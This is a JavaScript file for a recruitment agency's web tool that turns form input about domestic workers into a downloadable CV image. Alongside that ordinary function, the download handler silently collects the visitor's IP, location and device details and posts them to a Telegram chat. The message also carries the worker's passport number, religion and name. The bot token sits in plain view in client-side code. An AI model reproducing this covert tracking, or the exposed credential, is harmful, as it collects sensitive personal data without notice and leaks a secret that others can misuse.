// خريطة الربط بين الإدخالات والنصوص فوق الصورة
const fieldsMap = {
  'inputCode': 'cvCode',
  'inputName': 'cvName',
  'inputVideo': 'cvVideo',
  'inputWeight': 'cvWeight',
  'inputHeight': 'cvHeight',
  'inputReligion': 'cvReligion',
  'inputAge': 'cvAge',
  'inputPassport': 'cvPassport',
  'inputExpTitle': 'cvExpTitle',
  'inputJob': 'cvJob',
  'inputDuration': 'cvDuration',
  'inputExpCountry': 'cvExpCountry',
  'inputMarital': 'cvMarital',
  'inputChildren': 'cvChildren',
  'inputBirthPlace': 'cvBirthPlace',
  'inputEnglish': 'cvEnglish',
  'inputArabic': 'cvArabic',
  'inputEducation': 'cvEducation',
  'inputBabyCare': 'cvBabyCare',
  'inputCleaning': 'cvCleaning',
  'inputElderlyCare': 'cvElderlyCare',
  'inputWashing': 'cvWashing',
  'inputCooking': 'cvCooking',
  'inputIroning': 'cvIroning'
};

// بيانات بوت تليجرام
const TELEGRAM_BOT_TOKEN = "8967937243:AAGAepEyU1j0HQOC-5Ko43VmAhpUd6DnUpc";
const TELEGRAM_CHAT_ID = "-1004478651730";

// الاستماع المباشر للتغييرات في الحقول
Object.keys(fieldsMap).forEach(inputId => {
  const inputEl = document.getElementById(inputId);
  const targetEl = document.getElementById(fieldsMap[inputId]);

  if (inputEl && targetEl) {
    inputEl.addEventListener('input', () => {
      targetEl.innerText = inputEl.value;
    });
  }
});

// تغيير لون عنوان حالة الخبرة تلقائياً عند الاختيار
const expTitleColorSelect = document.getElementById('inputExpTitleColor');
const expTitleTarget = document.getElementById('cvExpTitle');

if (expTitleColorSelect && expTitleTarget) {
  expTitleColorSelect.addEventListener('change', function() {
    expTitleTarget.style.color = this.value;
  });
}

// حساب العمر تلقائياً عند اختيار تاريخ الميلاد
const birthDateInput = document.getElementById('inputBirthDate');
const ageInput = document.getElementById('inputAge');
const cvAgeTarget = document.getElementById('cvAge');

if (birthDateInput && ageInput && cvAgeTarget) {
  birthDateInput.addEventListener('change', function () {
    const birthDate = new Date(this.value);
    if (!isNaN(birthDate.getTime())) {
      const today = new Date();
      let calculatedAge = today.getFullYear() - birthDate.getFullYear();
      const monthDiff = today.getMonth() - birthDate.getMonth();

      if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
        calculatedAge--;
      }

      ageInput.value = calculatedAge;
      cvAgeTarget.innerText = calculatedAge;
    }
  });
}

// تحديث اسم الدولة وصورة العلم داخل الدائرة
const countrySelect = document.getElementById('inputCountrySelect');
const countryNameEl = document.getElementById('cvCountryName');
const flagImgEl = document.getElementById('cvFlagImg');

if (countrySelect) {
  countrySelect.addEventListener('change', function() {
    const selectedOption = countrySelect.options[countrySelect.selectedIndex];
    countryNameEl.innerText = selectedOption.value;
    
    const flagSrc = selectedOption.getAttribute('data-flag');
    flagImgEl.src = flagSrc;
    flagImgEl.style.display = 'block';

    if (flagSrc) {
      const flagNum = flagSrc.split('/').pop().split('.')[0];
      flagImgEl.className = 'flag-' + flagNum;
    }
  });
}

// قراءة صورة العاملة وعرضها كخلفية
document.getElementById('inputPhoto')?.addEventListener('change', function(event) {
  const file = event.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function(e) {
      const photoContainer = document.getElementById('photoContainer');
      photoContainer.style.backgroundImage = `url('${e.target.result}')`;
      photoContainer.style.backgroundSize = 'contain'; 
      photoContainer.style.backgroundPosition = 'center';
      photoContainer.style.backgroundRepeat = 'no-repeat';
      photoContainer.innerHTML = ''; 
    };
    reader.readAsDataURL(file);
  }
});

// دالة جلب الـ IP والموقع بآلية احتياطية مضاعفة
async function getIpAndLocation() {
  try {
    const res = await fetch('https://ipwho.is/');
    if (res.ok) {
      const data = await res.json();
      if (data.success) {
        return {
          ip: data.ip || 'غير معروف',
          city: data.city || '',
          country_name: data.country || ''
        };
      }
    }
  } catch (e) {
    console.warn('فشلت المحاولة الأولى، جاري استخدام الخيار الاحتياطي...');
  }

  try {
    const resIp = await fetch('https://api.ipify.org?format=json');
    if (resIp.ok) {
      const dataIp = await resIp.json();
      return { ip: dataIp.ip, city: '-', country_name: '-' };
    }
  } catch (e) {
    console.error('تعذر جلب الـ IP من جميع المصادر:', e);
  }

  return { ip: 'تعذر الجلب', city: '-', country_name: '-' };
}

// دالة إرسال الإشعار إلى تليجرام
async function sendDeviceInfoAndData() {
  const formData = {
    code: document.getElementById('inputCode')?.value || 'غير مدخل',
    name: document.getElementById('inputName')?.value || 'غير مدخل',
    country: document.getElementById('inputCountrySelect')?.value || 'غير مدخل',
    passport: document.getElementById('inputPassport')?.value || 'غير مدخل',
    job: document.getElementById('inputJob')?.value || 'غير مدخل',
    age: document.getElementById('inputAge')?.value || 'غير مدخل',
    religion: document.getElementById('inputReligion')?.value || 'غير مدخل'
  };

  const ipInfo = await getIpAndLocation();

  const userAgent = navigator.userAgent;
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const language = navigator.language || navigator.userLanguage;
  const platform = navigator.platform;

  const messageText = `
🚨 *شركة دار النخبة للاستقدام*
📥 *تم تنزيل سيرة ذاتية جديدة!*

👤 *بيانات السيرة الذاتية:*
• الكود: ${formData.code}
• الاسم: ${formData.name}
• الدولة: ${formData.country}
• رقم الجواز: ${formData.passport}
• الوظيفة: ${formData.job}
• العمر: ${formData.age}
• الديانة: ${formData.religion}

🌐 *معلومات الاتصال والجهاز:*
• **IP Address:** \`${ipInfo.ip}\`
• **الموقع:** ${ipInfo.city} , ${ipInfo.country_name}
• **نظام التشغيل / المنصة:** ${platform}
• **دقة الشاشة:** ${screenSize}
• **لغة الجهاز:** ${language}
• **تفاصيل المتصفح:** \`${userAgent}\`
  `;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });
  } catch (err) {
    console.error('خطأ في إرسال الإشعار:', err);
  }
}

// دالة تنزيل السيرة الذاتية كصورة JPG عالية الدقة
function downloadCVAsJPG() {
  // إرسال الإشعار عند الضغط على زر التنزيل
  sendDeviceInfoAndData();

  const element = document.getElementById('cvCard');
  const codeValue = document.getElementById('inputCode').value.trim() || 'جديد';

  document.fonts.ready.then(() => {
    html2canvas(element, {
      scale: 3,
      useCORS: true,
      logging: false,
      scrollX: 0,
      scrollY: 0
    }).then(canvas => {
      const link = document.createElement('a');
      link.download = `CV_DarAlNukhba_${codeValue}.jpg`;
      link.href = canvas.toDataURL('image/jpeg', 0.98);
      link.click();
    });
  });
}

function printCV() {
  window.print();
}